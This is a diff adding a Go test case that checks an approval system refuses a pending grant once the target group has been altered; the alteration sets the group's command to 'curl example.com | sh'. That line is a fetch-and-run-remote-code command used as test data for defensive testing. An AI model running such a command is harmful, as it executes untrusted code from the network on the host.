@@ -101,4 +101,18 @@ func TestRunAskGrantAsStale(t *testing.T) {
 	if got := y.grants(t); len(got) != 0 {
 		t.Fatalf("a refused approval granted %v", got)
 	}
+
+	// The As form stays held to each grantee too.
+	y = listYard(t)
+	seq = y.ask(t, listAsk("ada", "source grant crm read --group builders --as ada"), "yardmaster")
+	if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "mckean"); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada"); err == nil ||
+		!strings.Contains(err.Error(), "the group builders was another") || !strings.HasSuffix(err.Error(), nothingRan) {
+		t.Fatalf("approving after the grantee changed = %v", err)
+	}
+	if got := y.grants(t); len(got) != 0 {
+		t.Fatalf("the refused approval granted %v", got)
+	}
 }
